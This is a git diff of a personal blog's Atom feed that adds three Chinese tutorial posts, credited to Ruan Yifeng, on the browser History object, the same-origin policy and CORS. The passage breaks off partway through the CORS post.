@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://LiHaoGo.github.io</id>
     <title>LeYi</title>
-    <updated>2021-08-11T06:09:13.032Z</updated>
+    <updated>2021-08-11T06:16:13.195Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://LiHaoGo.github.io"/>
     <link rel="self" href="https://LiHaoGo.github.io/atom.xml"/>
@@ -10,4 +10,644 @@
     <logo>https://LiHaoGo.github.io/images/avatar.png</logo>
     <icon>https://LiHaoGo.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, LeYi</rights>
+    <entry>
+        <title type="html"><![CDATA[History 对象]]></title>
+        <id>https://LiHaoGo.github.io/post/history-dui-xiang/</id>
+        <link href="https://LiHaoGo.github.io/post/history-dui-xiang/">
+        </link>
+        <updated>2021-08-11T06:15:29.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="windowhistory属性指向-history-对象它表示当前窗口的浏览历史">window.history`属性指向 History 对象，它表示当前窗口的浏览历史。</h1>
+<p>History 对象保存了当前窗口访问过的所有页面网址</p>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="windowhistory属性指向-history-对象它表示当前窗口的浏览历史">window.history`属性指向 History 对象，它表示当前窗口的浏览历史。</h1>
+<p>History 对象保存了当前窗口访问过的所有页面网址</p>
+<!-- more -->
+<p>History 对象</p>
+<h2 id="1-概述">1. 概述</h2>
+<p><code>window.history</code>属性指向 History 对象，它表示当前窗口的浏览历史。</p>
+<p>History 对象保存了当前窗口访问过的所有页面网址。下面代码表示当前窗口一共访问过3个网址。</p>
+<pre><code class="language-js">window.history.length // 3
+</code></pre>
+<p>由于安全原因，浏览器不允许脚本读取这些地址，但是允许在地址之间导航。</p>
+<pre><code class="language-js">// 后退到前一个网址
+history.back()
+
+// 等同于
+history.go(-1)
+</code></pre>
+<p>浏览器工具栏的“前进”和“后退”按钮，其实就是对 History 对象进行操作。</p>
+<h2 id="2-属性">2. 属性</h2>
+<p>History 对象主要有两个属性。</p>
+<ul>
+<li><code>History.length</code>：当前窗口访问过的网址数量（包括当前网页）</li>
+<li><code>History.state</code>：History 堆栈最上层的状态值（详见下文）</li>
+</ul>
+<h2 id="3-方法">3. 方法</h2>
+<h3 id="31-historyback-historyforward-historygo">3.1 History.back()、History.forward()、History.go()</h3>
+<p>这三个方法用于在历史之中移动。</p>
+<ul>
+<li><code>History.back()</code>：移动到上一个网址，等同于点击浏览器的后退键。对于第一个访问的网址，该方法无效果。</li>
+<li><code>History.forward()</code>：移动到下一个网址，等同于点击浏览器的前进键。对于最后一个访问的网址，该方法无效果。</li>
+<li><code>History.go()</code>：接受一个整数作为参数，以当前网址为基准，移动到参数指定的网址，比如<code>go(1)</code>相当于<code>forward()</code>，<code>go(-1)</code>相当于<code>back()</code>。如果参数超过实际存在的网址范围，该方法无效果；如果不指定参数，默认参数为<code>0</code>，相当于刷新当前页面。</li>
+</ul>
+<pre><code class="language-js">history.back();
+history.forward();
+history.go(-2);
+</code></pre>
+<p><code>history.go(0)</code>相当于刷新当前页面。</p>
+<pre><code class="language-js">history.go(0);记录
+</code></pre>
+<p>注意，移动到以前访问过的页面时，页面通常是从浏览器缓存之中加载，而不是重新要求服务器发送新的网页。</p>
+<h3 id="32-historypushstate">3.2 History.pushState()，</h3>
+<p><code>History.pushState()</code>方法用于在历史中添加一条记录。</p>
+<pre><code class="language-js">window.history.pushState(state, title, url)
+</code></pre>
+<p>该方法接受三个参数，依次为：</p>
+<ul>
+<li><code>state</code>：一个与添加的记录相关联的状态对象，主要用于<code>popstate</code>事件。该事件触发时，该对象会传入回调函数。也就是说，浏览器会将这个对象序列化以后保留在本地，重新载入这个页面的时候，可以拿到这个对象。如果不需要这个对象，此处可以填<code>null</code>。</li>
+<li><code>title</code>：新页面的标题。但是，现在所有浏览器都忽视这个参数，所以这里可以填空字符串。</li>
+<li><code>url</code>：新的网址，必须与当前页面处在同一个域。浏览器的地址栏将显示这个网址。</li>
+</ul>
+<p>假定当前网址是<code>example.com/1.html</code>，使用<code>pushState()</code>方法在浏览记录（History 对象）中添加一个新记录。</p>
+<pre><code class="language-js">var stateObj = { foo: 'bar' };
+history.pushState(stateObj, 'page 2', '2.html');
+</code></pre>
+<p>添加新记录后，浏览器地址栏立刻显示<code>example.com/2.html</code>，但并不会跳转到<code>2.html</code>，甚至也不会检查<code>2.html</code>是否存在，它只是成为浏览历史中的最新记录。这时，在地址栏输入一个新的地址(比如访问<code>google.com</code>)，然后点击了倒退按钮，页面的 URL 将显示<code>2.html</code>；你再点击一次倒退按钮，URL 将显示<code>1.html</code>。</p>
+<p>总之，<code>pushState()</code>方法不会触发页面刷新，只是导致 History 对象发生变化，地址栏会有反应。</p>
+<p>使用该方法之后，就可以用<code>History.state</code>属性读出状态对象。</p>
+<pre><code class="language-js">var stateObj = { foo: 'bar' };
+history.pushState(stateObj, 'page 2', '2.html');
+history.state // {foo: &quot;bar&quot;}
+</code></pre>
+<p>如果<code>pushState</code>的 URL 参数设置了一个新的锚点值（即<code>hash</code>），并不会触发<code>hashchange</code>事件。反过来，如果 URL 的锚点值变了，则会在 History 对象创建一条浏览记录。</p>
+<p>如果<code>pushState()</code>方法设置了一个跨域网址，则会报错。</p>
+<pre><code class="language-js">// 报错
+// 当前网址为 http://example.com
+history.pushState(null, '', 'https://twitter.com/hello');
+</code></pre>
+<p>上面代码中，<code>pushState</code>想要插入一个跨域的网址，导致报错。这样设计的目的是，防止恶意代码让用户以为他们是在另一个网站上，因为这个方法不会导致页面跳转。</p>
+<h3 id="33-historyreplacestate">3.3 History.replaceState()</h3>
+<p><code>History.replaceState()</code>方法用来修改 History 对象的当前记录，其他都与<code>pushState()</code>方法一模一样。</p>
+<p>假定当前网页是<code>example.com/example.html</code>。</p>
+<pre><code class="language-js">history.pushState({page: 1}, 'title 1', '?page=1')// URL 显示为 http://example.com/example.html?page=1history.pushState({page: 2}, 'title 2', '?page=2');// URL 显示为 http://example.com/example.html?page=2history.replaceState({page: 3}, 'title 3', '?page=3');// URL 显示为 http://example.com/example.html?page=3history.back()// URL 显示为 http://example.com/example.html?page=1history.back()// URL 显示为 http://example.com/example.htmlhistory.go(2)// URL 显示为 http://example.com/example.html?page=3
+</code></pre>
+<h2 id="4-popstate-事件">4. popstate 事件</h2>
+<p>每当同一个文档的浏览历史（即<code>history</code>对象）出现变化时，就会触发<code>popstate</code>事件。</p>
+<p>注意，仅仅调用<code>pushState()</code>方法或<code>replaceState()</code>方法 ，并不会触发该事件，只有用户点击浏览器倒退按钮和前进按钮，或者使用 JavaScript 调用<code>History.back()</code>、<code>History.forward()</code>、<code>History.go()</code>方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。</p>
+<p>使用的时候，可以为<code>popstate</code>事件指定回调函数。</p>
+<pre><code class="language-js">window.onpopstate = function (event) {  console.log('location: ' + document.location);  console.log('state: ' + JSON.stringify(event.state));};// 或者window.addEventListener('popstate', function(event) {  console.log('location: ' + document.location);  console.log('state: ' + JSON.stringify(event.state));});
+</code></pre>
+<p>回调函数的参数是一个<code>event</code>事件对象，它的<code>state</code>属性指向<code>pushState</code>和<code>replaceState</code>方法为当前 URL 所提供的状态对象（即这两个方法的第一个参数）。上面代码中的<code>event.state</code>，就是通过<code>pushState</code>和<code>replaceState</code>方法，为当前 URL 绑定的<code>state</code>对象。</p>
+<p>这个<code>state</code>对象也可以直接通过<code>history</code>对象读取。</p>
+<pre><code class="language-js">var currentState = history.state;
+</code></pre>
+<p>注意，页面第一次加载的时候，浏览器不会触发<code>popstate</code>事件。</p>
+<h2 id="5-urlsearchparams-api">5. URLSearchParams API</h2>
+<p>URLSearchParams API 用于处理 URL 之中的查询字符串，即问号之后的部分。没有部署这个API的浏览器，可以用<a href="https://github.com/WebReflection/url-search-params">url-search-params</a>这个垫片库。</p>
+<pre><code class="language-js">var paramsString = 'q=URLUtils.searchParams&amp;topic=api';var searchParams = new URLSearchParams(paramsString);
+</code></pre>
+<p>URLSearchParams有以下方法，用来操作某个参数。</p>
+<ul>
+<li><code>has()</code>：返回一个布尔值，表示是否具有某个参数</li>
+<li><code>get()</code>：返回指定参数的第一个值</li>
+<li><code>getAll()</code>：返回一个数组，成员是指定参数的所有值</li>
+<li><code>set()</code>：设置指定参数</li>
+<li><code>delete()</code>：删除指定参数</li>
+<li><code>append()</code>：在查询字符串之中，追加一个键值对</li>
+<li><code>toString()</code>：返回整个查询字符串</li>
+</ul>
+<pre><code class="language-js">var paramsString = 'q=URLUtils.searchParams&amp;topic=api';var searchParams = new URLSearchParams(paramsString);searchParams.has('topic') // truesearchParams.get('topic') // &quot;api&quot;searchParams.getAll('topic') // [&quot;api&quot;]searchParams.get('foo') // null，注意Firefox返回空字符串searchParams.set('foo', 2);searchParams.get('foo') // 2searchParams.append('topic', 'webdev');searchParams.toString() // &quot;q=URLUtils.searchParams&amp;topic=api&amp;foo=2&amp;topic=webdev&quot;searchParams.append('foo', 3);searchParams.getAll('foo') // [2, 3]searchParams.delete('topic');searchParams.toString() // &quot;q=URLUtils.searchParams&amp;foo=2&amp;foo=3&quot;
+</code></pre>
+<p>URLSearchParams还有三个方法，用来遍历所有参数。</p>
+<ul>
+<li><code>keys()</code>：遍历所有参数名</li>
+<li><code>values()</code>：遍历所有参数值</li>
+<li><code>entries()</code>：遍历所有参数的键值对</li>
+</ul>
+<p>上面三个方法返回的都是<code>Iterator</code>对象。</p>
+<pre><code class="language-js">var searchParams = new URLSearchParams('key1=value1&amp;key2=value2');for (var key of searchParams.keys()) {  console.log(key);}// key1// key2for (var value of searchParams.values()) {  console.log(value);}// value1// value2for (var pair of searchParams.entries()) {  console.log(pair[0]+ ', '+ pair[1]);}// key1, value1// key2, value2
+</code></pre>
+<p>在Chrome浏览器之中，<code>URLSearchParams</code>实例本身就是<code>Iterator</code>对象，与<code>entries</code>方法返回值相同。所以，可以写成下面的样子。</p>
+<pre><code class="language-js">for (var p of searchParams) {  console.log(p);}
+</code></pre>
+<p>下面是一个替换当前URL的例子。</p>
+<pre><code class="language-js">// URL: https://example.com?version=1.0var params = new URLSearchParams(location.search.slice(1));params.set('version', 2.0);window.history.replaceState({}, '', `${location.pathname}?${params}`);// URL: https://example.com?version=2.0
+</code></pre>
+<p><code>URLSearchParams</code>实例可以当作 POST 数据发送，所有数据都会 URL 编码。</p>
+<pre><code class="language-js">let params = new URLSearchParams();params.append('api_key', '1234567890');fetch('https://example.com/api', {  method: 'POST',  body: params}).then(...)
+</code></pre>
+<p>DOM的<code>a</code>元素节点的<code>searchParams</code>属性，就是一个<code>URLSearchParams</code>实例。</p>
+<pre><code class="language-js">var a = document.createElement('a');a.href = 'https://example.com?filter=api';a.searchParams.get('filter') // &quot;api&quot;
+</code></pre>
+<p><code>URLSearchParams</code>还可以与<code>URL</code>接口结合使用。</p>
+<pre><code class="language-js">var url = new URL(location);var foo = url.searchParams.get('foo') || 'somedefault';
+</code></pre>
+<p>注: 本文来自http://javascript.ruanyifeng.com/bom/history.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[同源政策]]></title>
+        <id>https://LiHaoGo.github.io/post/tong-yuan-zheng-ce/</id>
+        <link href="https://LiHaoGo.github.io/post/tong-yuan-zheng-ce/">
+        </link>
+        <updated>2021-08-11T06:14:21.000Z</updated>
+        <summary type="html"><![CDATA[<p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>
+<!-- more -->
+<h2 id="1-概述">1. 概述</h2>
+<h3 id="11-含义">1.1 含义</h3>
+<p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>
+<p>最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是”三个相同“。</p>
+<blockquote>
+<ul>
+<li>协议相同</li>
+<li>域名相同</li>
+<li>端口相同</li>
+</ul>
+</blockquote>
+<p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略），它的同源情况如下。</p>
+<ul>
+<li><code>http://www.example.com/dir2/other.html</code>：同源</li>
+<li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li>
+<li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li>
+<li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li>
+<li><code>https://www.example.com/dir/page.html</code>：不同源（协议不同）</li>
+</ul>
+<h3 id="12-目的">1.2 目的</h3>
+<p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
+<p>设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息（比如存款总额）。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
+<p>由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
+<h3 id="13-限制范围">1.3 限制范围</h3>
+<p>随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。</p>
+<blockquote>
+<p>（1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。</p>
+<p>（2） 无法接触非同源网页的 DOM。</p>
+<p>（3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。</p>
+</blockquote>
+<p>另外，通过 JavaScript 脚本可以拿到其他窗口的<code>window</code>对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的<code>window</code>对象的九个属性和四个方法。</p>
+<ul>
+<li>window.closed</li>
+<li>window.frames</li>
+<li>window.length</li>
+<li>window.location</li>
+<li>window.opener</li>
+<li>window.parent</li>
+<li>window.self</li>
+<li>window.top</li>
+<li>window.window</li>
+<li>window.blur()</li>
+<li>window.close()</li>
+<li>window.focus()</li>
+<li>window.postMessage()</li>
+</ul>
+<p>上面的九个属性之中，只有<code>window.location</code>是可读写的，其他八个全部都是只读。</p>
+<p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。</p>
+<h2 id="2-cookie">2. Cookie</h2>
+<p>Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置<code>document.domain</code>共享 Cookie。</p>
+<p>举例来说，A 网页的网址是<code>http://w1.example.com/a.html</code>，B 网页的网址是<code>http://w2.example.com/b.html</code>，那么只要设置相同的<code>document.domain</code>，两个网页就可以共享 Cookie。因为浏览器通过<code>document.domain</code>属性来检查是否同源。</p>
+<pre><code class="language-js">// 两个网页都需要设置
+document.domain = 'example.com';
+</code></pre>
+<p>注意，A 和 B 两个网页都需要设置<code>document.domain</code>属性，才能达到同源的目的。因为设置<code>document.domain</code>的同时，会把端口重置为<code>null</code>，因此如果只设置一个网页的<code>document.domain</code>，会导致两个网址的端口不同，还是达不到同源的目的。</p>
+<p>现在，A 网页通过脚本设置一个 Cookie。</p>
+<pre><code class="language-js">document.cookie = &quot;test1=hello&quot;;
+</code></pre>
+<p>B 网页就可以读到这个 Cookie。</p>
+<pre><code class="language-js">var allCookie = document.cookie;
+</code></pre>
+<p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。</p>
+<p>另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如<code>.example.com</code>。</p>
+<pre><code class="language-js">Set-Cookie: key=value; domain=.example.com; path=/
+</code></pre>
+<p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。</p>
+<h2 id="3-iframe">3. iframe</h2>
+<p><code>iframe</code>元素可以在当前网页之中，嵌入其他网页。每个<code>iframe</code>元素形成自己的窗口，即有自己的<code>window</code>对象。<code>iframe</code>窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。</p>
+<p>比如，父窗口运行下面的命令，如果<code>iframe</code>窗口不是同源，就会报错。</p>
+<pre><code class="language-js">document
+.getElementById(&quot;myIFrame&quot;)
+.contentWindow
+.document
+// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
+</code></pre>
+<p>上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。</p>
+<p>反之亦然，子窗口获取主窗口的 DOM 也会报错。</p>
+<pre><code class="language-js">window.parent.document.body
+// 报错
+</code></pre>
+<p>这种情况不仅适用于<code>iframe</code>窗口，还适用于<code>window.open</code>方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。</p>
+<p>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的<code>document.domain</code>属性，就可以规避同源政策，拿到 DOM。</p>
+<p>对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。</p>
+<blockquote>
+<ul>
+<li>片段识别符（fragment identifier）</li>
+<li>跨文档通信API（Cross-document messaging）</li>
+</ul>
+</blockquote>
+<h3 id="31-片段识别符">3.1 片段识别符</h3>
+<p>片段标识符（fragment identifier）指的是，URL 的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</p>
+<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
+<pre><code class="language-js">var src = originURL + '#' + data;
+document.getElementById('myIFrame').src = src;
+</code></pre>
+<p>上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。</p>
+<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
+<pre><code class="language-js">window.onhashchange = checkMessage;
+
+function checkMessage() {
+  var message = window.location.hash;
+  // ...
+}
+</code></pre>
+<p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
+<pre><code class="language-js">parent.location.href = target + '#' + hash;
+</code></pre>
+<h3 id="32-windowpostmessage">3.2 window.postMessage()</h3>
+<p>上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。</p>
+<p>这个 API 为<code>window</code>对象新增了一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口<code>aaa.com</code>向子窗口<code>bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了。</p>
+<pre><code class="language-js">// 父窗口打开一个子窗口var popup = window.open('http://bbb.com', 'title');// 父窗口向子窗口发消息popup.postMessage('Hello World!', 'http://bbb.com');
+</code></pre>
+<p><code>postMessage</code>方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为<code>*</code>，表示不限制域名，向所有窗口发送。</p>
+<p>子窗口向父窗口发送消息的写法类似。</p>
+<pre><code class="language-js">// 子窗口向父窗口发消息window.opener.postMessage('Nice to see you', 'http://aaa.com');
+</code></pre>
+<p>父窗口和子窗口都可以通过<code>message</code>事件，监听对方的消息。</p>
+<pre><code class="language-js">// 父窗口和子窗口都可以用下面的代码，// 监听 message 消息window.addEventListener('message', function (e) {  console.log(e.data);},false);
+</code></pre>
+<p><code>message</code>事件的参数是事件对象<code>event</code>，提供以下三个属性。</p>
+<blockquote>
+<ul>
+<li><code>event.source</code>：发送消息的窗口</li>
+<li><code>event.origin</code>: 消息发向的网址</li>
+<li><code>event.data</code>: 消息内容</li>
+</ul>
+</blockquote>
+<p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p>
+<pre><code class="language-js">window.addEventListener('message', receiveMessage);function receiveMessage(event) {  event.source.postMessage('Nice to see you!', '*');}
+</code></pre>
+<p>上面代码有几个地方需要注意。首先，<code>receiveMessage</code>函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，<code>postMessage</code>方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。</p>
+<p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p>
+<pre><code class="language-js">window.addEventListener('message', receiveMessage);function receiveMessage(event) {  if (event.origin !== 'http://aaa.com') return;  if (event.data === 'Hello World') {    event.source.postMessage('Hello', event.origin);  } else {    console.log(event.data);  }}
+</code></pre>
+<h3 id="343-localstorage">3.43 LocalStorage</h3>
+<p>通过<code>window.postMessage</code>，读写其他窗口的 LocalStorage 也成为了可能。</p>
+<p>下面是一个例子，主窗口写入 iframe 子窗口的<code>localStorage</code>。</p>
+<pre><code class="language-js">window.onmessage = function(e) {  if (e.origin !== 'http://bbb.com') {    return;  }  var payload = JSON.parse(e.data);  localStorage.setItem(payload.key, JSON.stringify(payload.data));};
+</code></pre>
+<p>上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。</p>
+<p>父窗口发送消息的代码如下。</p>
+<pre><code class="language-js">var win = document.getElementsByTagName('iframe')[0].contentWindow;var obj = { name: 'Jack' };win.postMessage(  JSON.stringify({key: 'storage', data: obj}),  'http://bbb.com');
+</code></pre>
+<p>加强版的子窗口接收消息的代码如下。</p>
+<pre><code class="language-js">window.onmessage = function(e) {  if (e.origin !== 'http://bbb.com') return;  var payload = JSON.parse(e.data);  switch (payload.method) {    case 'set':      localStorage.setItem(payload.key, JSON.stringify(payload.data));      break;    case 'get':      var parent = window.parent;      var data = localStorage.getItem(payload.key);      parent.postMessage(data, 'http://aaa.com');      break;    case 'remove':      localStorage.removeItem(payload.key);      break;  }};
+</code></pre>
+<p>加强版的父窗口发送消息代码如下。</p>
+<pre><code class="language-js">var win = document.getElementsByTagName('iframe')[0].contentWindow;var obj = { name: 'Jack' };// 存入对象win.postMessage(  JSON.stringify({key: 'storage', method: 'set', data: obj}),  'http://bbb.com');// 读取对象win.postMessage(  JSON.stringify({key: 'storage', method: &quot;get&quot;}),  &quot;*&quot;);window.onmessage = function(e) {  if (e.origin != 'http://aaa.com') return;  console.log(JSON.parse(e.data).name);};
+</code></pre>
+<h2 id="4-ajax">4. AJAX</h2>
+<p>同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。</p>
+<p>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p>
+<blockquote>
+<ul>
+<li>JSONP</li>
+<li>WebSocket</li>
+<li>CORS</li>
+</ul>
+</blockquote>
+<h3 id="41-jsonp">4.1 JSONP</h3>
+<p>JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务端改造非常小。</p>
+<p>它的基本思想是，网页通过添加一个<code>&lt;script&gt;</code>元素，向服务器请求 JSON 数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。</p>
+<p>首先，网页动态插入<code>&lt;script&gt;</code>元素，由它向跨源网址发出请求。</p>
+<pre><code class="language-js">function addScriptTag(src) {  var script = document.createElement('script');  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);  script.src = src;  document.body.appendChild(script);}window.onload = function () {  addScriptTag('http://example.com/ip?callback=foo');}function foo(data) {  console.log('Your public IP address is: ' + data.ip);};
+</code></pre>
+<p>上面代码通过动态添加<code>&lt;script&gt;</code>元素，向服务器<code>example.com</code>发出请求。注意，该请求的查询字符串有一个<code>callback</code>参数，用来指定回调函数的名字，这对于 JSONP 是必需的。</p>
+<p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p>
+<pre><code class="language-js">foo({  &quot;ip&quot;: &quot;8.8.8.8&quot;});
+</code></pre>
+<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p>
+<h3 id="42-websocket">4.2 WebSocket</h3>
+<p>WebSocket 是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>
+<p>下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自<a href="https://en.wikipedia.org/wiki/WebSocket">维基百科</a>）。</p>
+<pre><code class="language-js">GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==Sec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13Origin: http://example.com
+</code></pre>
+<p>上面代码中，有一个字段是<code>Origin</code>，表示该请求的请求源（origin），即发自哪个域名。</p>
+<p>正是因为有了<code>Origin</code>这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p>
+<pre><code class="language-js">HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat
+</code></pre>
+<h3 id="43-cors">4.3 CORS</h3>
+<p>CORS 是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发<code>GET</code>请求，CORS 允许任何类型的请求。</p>
+<p>CORS具体介绍:https://www.cnblogs.com/LiHaoGo/p/15117540.html</p>
+<p>注: 本文来自 http://javascript.ruanyifeng.com/bom/same-origin.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CORS 通信]]></title>
+        <id>https://LiHaoGo.github.io/post/cors-tong-xin/</id>
+        <link href="https://LiHaoGo.github.io/post/cors-tong-xin/">
+        </link>
+        <updated>2021-08-11T06:13:11.000Z</updated>
+        <summary type="html"><![CDATA[<p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能。</p>
+<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨域，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨域通信。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能。</p>
+<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨域，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨域通信。</p>
+<!-- more -->
+<h2 id="1-简介">1. 简介</h2>
+<p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能。</p>
+<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨域，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨域通信。</p>
+<h2 id="2-两种请求">2. 两种请求</h2>
+<p>CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
+<p>只要同时满足以下两大条件，就属于简单请求。</p>
+<p>（1）请求方法是以下三种方法之一。</p>
+<blockquote>
+<ul>
+<li>HEAD</li>
+<li>GET</li>
+<li>POST</li>
+</ul>
+</blockquote>
+<p>（2）HTTP 的头信息不超出以下几种字段。</p>
+<blockquote>
+<ul>
+<li>Accept</li>
+<li>Accept-Language</li>
+<li>Content-Language</li>
+<li>Last-Event-ID</li>
+<li>Content-Type：只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li>
+</ul>
+</blockquote>
+<p>凡是不同时满足上面两个条件，就属于非简单请求。一句话，简单请求就是简单的 HTTP 方法与简单的 HTTP 头信息的结合。</p>
+<p>这样划分的原因是，表单在历史上一直可以跨域发出请求。简单请求就是表单请求，浏览器沿袭了传统的处理方式，不把行为复杂化，否则开发者可能转而使用表单，规避 CORS 的限制。对于非简单请求，浏览器会采用新的处理方式。</p>
+<h2 id="3-简单请求">3. 简单请求</h2>
+<h3 id="31-基本流程">3.1 基本流程</h3>
+<p>对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。</p>
+<p>下面是一个例子，浏览器发现这次跨域 AJAX 请求是简单请求，就自动在头信息之中，添加一个<code>Origin</code>字段。</p>
+<pre><code class="language-http">GET /cors HTTP/1.1
+Origin: http://api.bob.com
+Host: api.alice.com
+Accept-Language: en-US
+Connection: keep-alive
+User-Agent: Mozilla/5.0...
+</code></pre>
+<p>上面的头信息中，<code>Origin</code>字段用来说明，本次请求来自哪个域（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>
+<p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含<code>Access-Control-Allow-Origin</code>字段（详见下文），就知道出错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是200。</p>
